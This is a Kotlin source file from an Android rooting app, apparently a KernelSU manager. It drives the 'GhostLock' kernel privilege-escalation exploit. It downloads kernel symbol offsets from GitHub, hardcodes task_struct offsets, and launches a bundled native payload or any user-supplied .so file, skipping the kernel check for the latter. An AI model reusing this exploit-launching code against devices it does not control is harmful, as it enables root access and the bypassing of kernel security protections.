package com.agnessu.yakayn.data.ghostlock

import android.content.Context
import android.net.Uri
import android.system.Os
import android.util.Base64
import com.agnessu.yakayn.data.network.NetworkRequestRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * GhostLock kernel-exploit integration.
 *
 * The payload (`libghostlock.so`, vendored under manager/ghostlock/) races a
 * wait-queue bug to gain uid 0 on a fixed set of GKI kernels, then late-loads
 * KernelSU. The supported set lives online in
 * https://github.com/YuKongA/ghostlock-app (`src/kernels/<uname-release>/offsets.h`),
 * so support is checked against the GitHub API instead of a snapshot compiled in.
 *
 * Matching a kernel means its full offsets are pulled online and written to
 * `filesDir/offsets.json`, which the payload prefers over its built-in tables.
 */
class GhostlockRepository(
    private val context: Context,
    private val network: NetworkRequestRepository,
) {
    companion object {
        private const val API_ROOT =
            "https://api.github.com/repos/YuKongA/ghostlock-app/contents/src/kernels"

        private val GITHUB_HEADERS = mapOf(
            "Accept" to "application/vnd.github+json",
        )

        /** Symbol offsets nested under "symbols". */
        private val SYMBOL_FIELDS = listOf(
            "off_init_task", "off_init_cred", "off_root_task_group",
            "off_selinux_enforcing", "off_selinux_blob_sizes", "off_security_hook_heads",
            "off_slide_nfulnl_logger", "off_slide_loggers_0_1", "off_slide_boot_id",
        )

        /** Struct offsets nested under "struct_fields". */
        private val STRUCT_FIELDS = listOf(
            "task_prio", "task_normal_prio", "task_sched_task_group",
            "task_pi_lock", "task_pi_waiters", "task_pi_top_task", "task_pi_blocked_on",
            "task_pid", "task_tgid", "task_atomic_flags",
            "task_real_cred", "task_cred", "task_comm", "task_tasks", "task_seccomp",
        )

        /** STRUCT_OFFSETS_* expansions from src/kernels/offsets.h, hardcoded. */
        private val STRUCT_MACROS: Map<String, Map<String, Long>> = mapOf(
            "STRUCT_OFFSETS_6_1" to mapOf(
                "task_prio" to 0x84L, "task_normal_prio" to 0x8CL, "task_sched_task_group" to 0x348L,
                "task_pi_lock" to 0x924L, "task_pi_waiters" to 0x938L,
                "task_pi_top_task" to 0x948L, "task_pi_blocked_on" to 0x950L,
                "task_pid" to 0x630L, "task_tgid" to 0x634L, "task_atomic_flags" to 0x5F0L,
                "task_real_cred" to 0x830L, "task_cred" to 0x838L, "task_comm" to 0x848L,
                "task_tasks" to 0x550L, "task_seccomp" to 0x900L,
                "compact_waiter" to 1L, "mm_struct_sz" to 0x400L,
            ),
            "STRUCT_OFFSETS_6_6" to mapOf(
                "task_prio" to 0x84L, "task_normal_prio" to 0x8CL, "task_sched_task_group" to 0x348L,
                "task_pi_lock" to 0x90CL, "task_pi_waiters" to 0x920L,
                "task_pi_top_task" to 0x930L, "task_pi_blocked_on" to 0x938L,
                "task_pid" to 0x618L, "task_tgid" to 0x61CL, "task_atomic_flags" to 0x5D8L,
                "task_real_cred" to 0x818L, "task_cred" to 0x820L, "task_comm" to 0x830L,
                "task_tasks" to 0x550L, "task_seccomp" to 0x8E8L,
            ),
            "STRUCT_OFFSETS_6_12" to mapOf(
                "task_prio" to 0x94L, "task_normal_prio" to 0x9CL, "task_sched_task_group" to 0x420L,
                "task_pi_lock" to 0x9ECL, "task_pi_waiters" to 0xA00L,
                "task_pi_top_task" to 0xA10L, "task_pi_blocked_on" to 0xA18L,
                "task_pid" to 0x708L, "task_tgid" to 0x70CL, "task_atomic_flags" to 0x6C8L,
                "task_real_cred" to 0x8F8L, "task_cred" to 0x900L, "task_comm" to 0x910L,
                "task_tasks" to 0x638L, "task_seccomp" to 0x9C8L,
            ),
        )
    }

    /** Current kernel release (== `uname -r`). */
    val kernelRelease: String
        get() = System.getProperty("os.version", "").orEmpty()

    /** GhostLock is aarch64-only. */
    fun isSupportedArch(): Boolean =
        runCatching { Os.uname().machine == "aarch64" }.getOrDefault(false)

    /** Lists the online kernel releases (directory names under src/kernels). */
    suspend fun fetchOnlineKernels(): Result<Set<String>> = withContext(Dispatchers.IO) {
        runCatching {
            val body = network.fetch(API_ROOT, headers = GITHUB_HEADERS).getOrThrow()
            val entries = JSONArray(body)
            buildSet {
                for (index in 0 until entries.length()) {
                    val entry = entries.optJSONObject(index) ?: continue
                    if (entry.optString("type") == "dir") {
                        val name = entry.optString("name")
                        if (name.isNotEmpty()) add(name)
                    }
                }
            }
        }
    }

    /** True when the device kernel has an online offsets.h entry. */
    suspend fun isKernelSupportedOnline(): Result<Boolean> = withContext(Dispatchers.IO) {
        runCatching {
            kernelRelease in fetchOnlineKernels().getOrThrow()
        }
    }

    /**
     * Pulls the matched kernel's offsets.h and renders it as an offsets.json
     * entry (full scalar + symbol + struct offsets), ready for the payload.
     */
    suspend fun extractOffsets(release: String): Result<JSONObject> = withContext(Dispatchers.IO) {
        runCatching {
            val body = network.fetch("$API_ROOT/$release/offsets.h", headers = GITHUB_HEADERS)
                .getOrThrow()
            val content = JSONObject(body).optString("content").ifBlank {
                error("empty offsets.h content")
            }
            // GitHub wraps base64 at 60 chars; strip whitespace before decoding.
            val header = String(
                Base64.decode(content.filterNot { it.isWhitespace() }, Base64.DEFAULT),
                Charsets.UTF_8,
            )
            parseOffsetsHeader(header, release)
        }
    }

    /**
     * Writes offsets.json for [release], copies our ksud next to it, then runs
     * the payload. Streams payload output to [onLog]; returns the exit code.
     */
    suspend fun runExploit(release: String, onLog: (String) -> Unit): Result<Int> =
        withContext(Dispatchers.IO) {
            try {
                Result.success(doRunExploit(release, onLog))
            } catch (error: kotlinx.coroutines.CancellationException) {
                throw error
            } catch (error: Throwable) {
                Result.failure(error)
            }
        }

    /**
     * Runs a user-supplied payload.so instead of the bundled libghostlock.so.
     * The picked content:// file is copied into filesDir and chmod'd 0755, then
     * executed with the same offsets + ksud setup as the built-in path — except
     * the kernel is deliberately NOT checked online here, so a custom payload
     * may target any kernel. Offsets are written only when the running kernel
     * happens to have an online entry (best effort).
     */
    suspend fun runCustomPayload(uri: Uri, onLog: (String) -> Unit): Result<Int> =
        withContext(Dispatchers.IO) {
            try {
                val workDir = context.filesDir
                val payload = File(workDir, "ghostlock_custom.so")
                context.contentResolver.openInputStream(uri)?.use { input ->
                    payload.outputStream().use { output -> input.copyTo(output) }
                } ?: error("cannot open picked payload")
                Os.chmod(payload.absolutePath, 0b111101101) // 0755
                onLog("custom payload staged to ${payload.absolutePath}")

                runCatching {
                    val offsets = extractOffsets(kernelRelease).getOrThrow()
                    File(workDir, "offsets.json").writeText("[${offsets}]")
                    onLog("offsets.json written for $kernelRelease")
                }.onFailure { onLog("offsets skipped: ${it.message}") }

                prepareKsud(workDir, onLog)
                Result.success(runPayload(payload, workDir, onLog))
            } catch (error: kotlinx.coroutines.CancellationException) {
                throw error
            } catch (error: Throwable) {
                Result.failure(error)
            }
        }

    private suspend fun doRunExploit(release: String, onLog: (String) -> Unit): Int {
        val workDir = context.filesDir
        val payload = File(context.applicationInfo.nativeLibraryDir, "libghostlock.so")
        require(payload.isFile) { "missing libghostlock.so payload" }

        val offsets = extractOffsets(release).getOrThrow()
        File(workDir, "offsets.json").writeText("[${offsets}]")
        onLog("offsets.json written for $release")

        prepareKsud(workDir, onLog)
        return runPayload(payload, workDir, onLog)
    }

    /** Executes [payload] from [workDir], streaming its merged output to [onLog]. */
    private fun runPayload(payload: File, workDir: File, onLog: (String) -> Unit): Int {
        val process = ProcessBuilder(payload.absolutePath)
            .directory(workDir)
            .redirectErrorStream(true)
            .apply {
                environment()["GHOSTLOCK_HOME"] = workDir.absolutePath
                environment()["TMPDIR"] = workDir.absolutePath
                environment()["HOME"] = workDir.absolutePath
            }
            .start()
        process.inputStream.bufferedReader().useLines { lines ->
            lines.forEach(onLog)
        }
        return process.waitFor()
    }

    /** Copies our own ksud into [workDir] so the payload's $HOME_DIR/ksud resolves first. */
    private fun prepareKsud(workDir: File, onLog: (String) -> Unit) {
        val source = File(context.applicationInfo.nativeLibraryDir, "libksud.so")
        if (!source.isFile) {
            onLog("warning: libksud.so missing (build ksud + repack); payload will search installed apps")
            return
        }
        val output = File(workDir, "ksud")
        runCatching {
            source.inputStream().use { input -> output.outputStream().use { input.copyTo(it) } }
            Os.chmod(output.absolutePath, 0b111101101) // 0755
            onLog("ksud copied to ${output.absolutePath}")
        }.onFailure { onLog("ksud copy failed: ${it.message}") }
    }

    /** Parses an OFFSETS_ENTRY block into an offsets.json object. */
    private fun parseOffsetsHeader(header: String, fallbackRelease: String): JSONObject {
        val entryMatch = Regex("OFFSETS_ENTRY\\s*\\(\\s*\"([^\"]+)\"")
            .find(header)
            ?: error("no OFFSETS_ENTRY in offsets.h")
        val release = entryMatch.groupValues[1].ifBlank { fallbackRelease }

        val start = entryMatch.range.first
        val end = header.indexOf("\n),", start).let { if (it < 0) header.length else it }
        val block = header.substring(start, end)

        val fields = STRUCT_MACROS[Regex("STRUCT_OFFSETS_[A-Za-z0-9_]+").find(block)?.value]
            .orEmpty()
            .toMutableMap()
        Regex("\\.([A-Za-z0-9_]+)\\s*=\\s*(0[xX][0-9A-Fa-f]+|-?\\d+)")
            .findAll(block)
            .forEach { match -> fields[match.groupValues[1]] = parseLong(match.groupValues[2]) }

        return buildOffsetsJson(release, fields)
    }

    private fun buildOffsetsJson(release: String, fields: Map<String, Long>): JSONObject {
        val symbols = JSONObject()
        SYMBOL_FIELDS.forEach { name -> fields[name]?.let { symbols.put(name, it) } }

        val structFields = JSONObject()
        STRUCT_FIELDS.forEach { name -> fields[name]?.let { structFields.put(name, it) } }

        val json = JSONObject()
        json.put("release", release)
        fields["pselect_waiter_shift"]?.let { json.put("pselect_waiter_shift", it) }
        fields["compact_waiter"]?.let { json.put("compact_waiter", it) }
        fields["mm_struct_sz"]?.takeIf { it != 0L }?.let { json.put("mm_struct_sz", it) }
        fields["kernel_phys_load"]?.takeIf { it != 0L }?.let { json.put("kernel_phys_load", it) }
        json.put("symbols", symbols)
        json.put("struct_fields", structFields)
        return json
    }

    private fun parseLong(value: String): Long =
        if (value.startsWith("0x", ignoreCase = true)) value.substring(2).toLong(16) else value.toLong()
}
